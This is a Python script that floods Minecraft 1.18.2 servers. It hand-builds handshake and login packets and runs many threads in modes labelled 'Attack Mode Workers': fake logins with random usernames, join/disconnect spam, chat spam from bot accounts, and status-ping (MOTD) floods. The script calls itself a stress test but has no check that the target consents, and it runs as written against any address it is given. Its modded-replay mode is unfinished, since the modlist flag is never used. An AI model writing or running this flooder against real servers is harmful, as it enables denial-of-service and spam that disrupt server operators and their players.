import socket
import struct
import random
import string
import threading
import time
import json

modlist_cache = None

# --- Packet Utilities ---

def pack_varint(value):
    """Packs an integer into a VarInt."""
    out = b""
    while True:
        byte = value & 0x7F
        value >>= 7
        if value != 0:
            byte |= 0x80
        out += struct.pack("B", byte)
        if value == 0:
            break
    return out

def pack_string(value):
    """Packs a string with its VarInt length."""
    return pack_varint(len(value)) + value.encode('utf-8')

def pack_packet(packet_id, data):
    """Packs a packet with its ID and data."""
    data = pack_varint(packet_id) + data
    return pack_varint(len(data)) + data

# --- Core Connection Logic ---

def send_fake_join(ip, port, username):
    """Establishes a connection and performs a fake login. Returns the socket if successful."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))

        # Handshake Packet
        handshake_data = (
            pack_varint(758) +  # Protocol version (1.18.2)
            pack_string(ip) +
            struct.pack(">H", port) +
            pack_varint(2)  # State 2: Login
        )
        sock.sendall(pack_packet(0x00, handshake_data))

        # Login Start Packet
        login_data = pack_string(username)
        sock.sendall(pack_packet(0x00, login_data))

        # Keep connection alive briefly to ensure login is processed
        sock.settimeout(0.5)
        sock.recv(1024) # Wait for server response (e.g., Set Compression or Login Success)
        return sock
    except Exception as e:
        print(f"[STRESS-ERROR] Actor failed to connect/send to {ip}:{port} - {e}")
        if 'sock' in locals():
            sock.close()
        return None

def send_chat_message(sock, message):
    """Sends a chat message on an established socket."""
    try:
        chat_data = pack_string(message)
        sock.sendall(pack_packet(0x03, chat_data)) # Packet ID for Chat Message (Serverbound)
        return True
    except Exception:
        return False

def send_motd_request(ip, port):
    """Performs a server list ping (MOTD request)."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(2)
            sock.connect((ip, port))
            
            # Handshake for Status
            handshake_data = pack_varint(758) + pack_string(ip) + struct.pack(">H", port) + pack_varint(1)
            sock.sendall(pack_packet(0x00, handshake_data))
            
            # Status Request
            sock.sendall(pack_packet(0x00, b''))
            sock.recv(4096) # Read response
    except Exception as e:
        print(f"[STRESS-ERROR] MOTD probe failed for {ip}:{port} - {e}")

# --- Attack Mode Workers ---

def worker_login_flood(stop_time, ip, port, use_modlist):
    """Worker for simple login flood."""
    while time.time() < stop_time:
        username = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        sock = send_fake_join(ip, port, username)
        if sock:
            # Don't close immediately, let the server process the join fully
            time.sleep(0.5) 
            sock.close()

def worker_join_spam(stop_time, ip, port):
    """Worker for connect/disconnect spam."""
    while time.time() < stop_time:
        username = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        sock = send_fake_join(ip, port, username)
        if sock:
            time.sleep(random.uniform(1, 4)) # Stay connected for a short, random duration
            sock.close()
        time.sleep(random.uniform(0.1, 0.5)) # Wait before reconnecting

def worker_chat_flood(stop_time, ip, port):
    """Worker for joining and spamming chat."""
    username = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    sock = send_fake_join(ip, port, username)
    if not sock:
        return # Failed to connect, thread exits

    while time.time() < stop_time:
        message = ''.join(random.choices(string.ascii_letters + string.digits + ' ', k=random.randint(10, 50)))
        if not send_chat_message(sock, message):
            break # Socket closed or error
        time.sleep(random.uniform(0.5, 2)) # Wait between messages
    sock.close()

def worker_motd_spam(stop_time, ip, port):
    """Worker for spamming MOTD requests."""
    while time.time() < stop_time:
        send_motd_request(ip, port)
        time.sleep(random.uniform(0.05, 0.2))

# --- Main Orchestrator ---

def run_stress(ip, port, threads=100, duration=30, mode="login_flood", use_modlist=False):
    stop_time = time.time() + duration
    
    worker_map = {
        "login_flood": (worker_login_flood, (stop_time, ip, port, use_modlist)),
        "join_spam": (worker_join_spam, (stop_time, ip, port)),
        "chat_flood": (worker_chat_flood, (stop_time, ip, port)),
        "motd_spam": (worker_motd_spam, (stop_time, ip, port)),
        "modded_replay": (worker_login_flood, (stop_time, ip, port, True)), # Uses modlist
    }

    target_worker, args = worker_map.get(mode, (worker_login_flood, (stop_time, ip, port, use_modlist)))
    
    print(f"Starting stress test: mode={mode}, threads={threads}, duration={duration}s")
    
    thread_pool = []
    for _ in range(threads):
        thread = threading.Thread(target=target_worker, args=args, daemon=True)
        thread_pool.append(thread)
        thread.start()

    for thread in thread_pool:
        thread.join(timeout=duration + 5) # Wait for threads to finish

def probe_modlist(ip, port):
    """Probes a server for its modlist for use in modded_replay mode."""
    global modlist_cache
    try:
        print(f"[PROBE-INFO] Probing {ip}:{port} for modlist...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(5)
            sock.connect((ip, port))

            # Handshake for Status
            handshake_data = pack_varint(758) + pack_string(ip) + struct.pack(">H", port) + pack_varint(1)
            sock.sendall(pack_packet(0x00, handshake_data))
            
            # Status Request
            sock.sendall(pack_packet(0x00, b''))
            
            # Read response packets
            # This part is complex as the response can be split into multiple TCP packets.
            # For now, we assume the relevant part is in the first large recv.
            # A full implementation would need a proper packet parser.
            data = sock.recv(8192)
            modlist_cache = [data] # Simplified caching
            print(f"[PROBE-SUCCESS] Successfully probed {ip}:{port}. Modlist cached.")
    except Exception as e:
        print(f"[PROBE-ERROR] Actor failed to probe {ip}:{port} - {e}")
        modlist_cache = None
